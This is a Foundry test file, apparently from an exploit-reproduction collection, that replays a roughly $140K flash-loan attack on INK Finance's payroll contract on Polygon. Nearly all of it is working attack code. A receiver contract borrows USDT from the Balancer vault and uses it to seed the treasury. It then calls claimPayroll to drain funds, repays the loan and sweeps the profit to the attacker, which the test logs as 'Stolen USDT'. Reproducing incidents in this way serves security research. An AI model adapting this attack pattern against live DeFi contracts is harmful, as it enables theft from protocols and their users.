// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
// @KeyInfo - Total Lost : ~$140K
// Attacker : https://polygonscan.com/address/0x90b147592191388e955401af43842e19faa87ee2
// Attack Contract : https://polygonscan.com/address/0x74f28b9A35D72504E007C60803eF47f1A44b109e
// Vulnerable Contract : https://polygonscan.com/address/0xeF2C77f3B9b8aaa067239bc6B4588Bae26433494
// Attack Tx : https://polygonscan.com/tx/0xb469a24ec737be16fe41367a7b5b315c7f03b4e0ff3af50b3a2db03b3066b982
//
// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0xeF2C77f3B9b8aaa067239bc6B4588Bae26433494#code
//
// @Analysis
// Post-mortem : N/A
// Hacking God : https://www.cryptotimes.io/2026/05/11/ink-finance-exploited-on-polygon-140k-usdt-drained-in-flash-loan-attack/

contract INKFinanceTest is Test {
    bytes32 internal constant TX_HASH = 0xb469a24ec737be16fe41367a7b5b315c7f03b4e0ff3af50b3a2db03b3066b982;
    address internal constant EXPLOITER = 0x90b147592191388e955401af43842e19faa87ee2;
    address internal constant EXPLOIT_CONTRACT = 0x74f28b9A35D72504E007C60803eF47f1A44b109e;
    address internal constant FLASH_LOAN_RECEIVER = 0xD7C643517F98F58D3F9BA91De05d4f62620cFd10;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant TREASURY = 0xa184Af4B1c01815A4B57422A3419E4FB78a96Ee4;
    uint256 internal constant FLASH_LOAN_AMOUNT = 24_982_654_321;
    IERC20 internal constant USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);

    function setUp() public {
        vm.createSelectFork("polygon", TX_HASH);

        INKFinanceFlashLoanReceiver receiver = new INKFinanceFlashLoanReceiver(EXPLOITER);
        vm.etch(FLASH_LOAN_RECEIVER, address(receiver).code);

        vm.label(EXPLOITER, "Sender");
        vm.label(EXPLOIT_CONTRACT, "Receiver");
        vm.label(FLASH_LOAN_RECEIVER, "INK Flash Loan Receiver");
        vm.label(BALANCER_VAULT, "Vault");
        vm.label(address(USDT), "USDT0");
    }

    function testExploit() public {
        uint256 beforeUsdt = USDT.balanceOf(EXPLOITER);

        assertEq(vm.getNonce(EXPLOITER), 0, "unexpected deployer nonce");

        address[] memory tokens = new address[](1);
        tokens[0] = address(USDT);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_AMOUNT;

        vm.prank(EXPLOITER, EXPLOITER);
        IINKBalancerVault(BALANCER_VAULT).flashLoan(FLASH_LOAN_RECEIVER, tokens, amounts, "");

        uint256 usdtProfit = USDT.balanceOf(EXPLOITER) - beforeUsdt;
        assertGt(FLASH_LOAN_RECEIVER.code.length, 0, "receiver was not installed");
        assertEq(USDT.balanceOf(BALANCER_VAULT), 25_851_883_528, "flash loan not repaid");
        assertEq(USDT.balanceOf(TREASURY), 0, "treasury balance mismatch");
        assertEq(usdtProfit, 140_180_175_562);

        console.log("Stolen USDT", usdtProfit);
    }
}

contract INKFinanceFlashLoanReceiver {
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant PAYROLL = 0xeF2C77f3B9b8aaa067239bc6B4588Bae26433494;
    address internal constant TREASURY = 0xa184Af4B1c01815A4B57422A3419E4FB78a96Ee4;
    IERC20 internal constant USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    uint256 internal constant EMPLOYEE_ID = 3;
    bytes4 internal constant PAYROLL_RECEIVER_INTERFACE_ID = 0xf3384444;

    address internal immutable EXPLOITER;

    constructor(address exploiter) {
        EXPLOITER = exploiter;
    }

    function receiveFlashLoan(
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        userData;
        require(msg.sender == BALANCER_VAULT, "unexpected vault");
        require(tokens.length == 1 && address(tokens[0]) == address(USDT), "unexpected token");
        require(feeAmounts.length == 1 && feeAmounts[0] == 0, "unexpected fee");

        require(USDT.transfer(TREASURY, amounts[0]), "seed treasury failed");
        IINKPayroll(PAYROLL).claimPayroll(EMPLOYEE_ID);
        require(USDT.transfer(BALANCER_VAULT, amounts[0]), "repay failed");
        require(USDT.transfer(EXPLOITER, USDT.balanceOf(address(this))), "sweep failed");
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == PAYROLL_RECEIVER_INTERFACE_ID || interfaceId == type(IERC165).interfaceId;
    }
}

interface IINKBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IINKPayroll {
    function claimPayroll(uint256 employeeId) external;
}

interface IERC165 {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}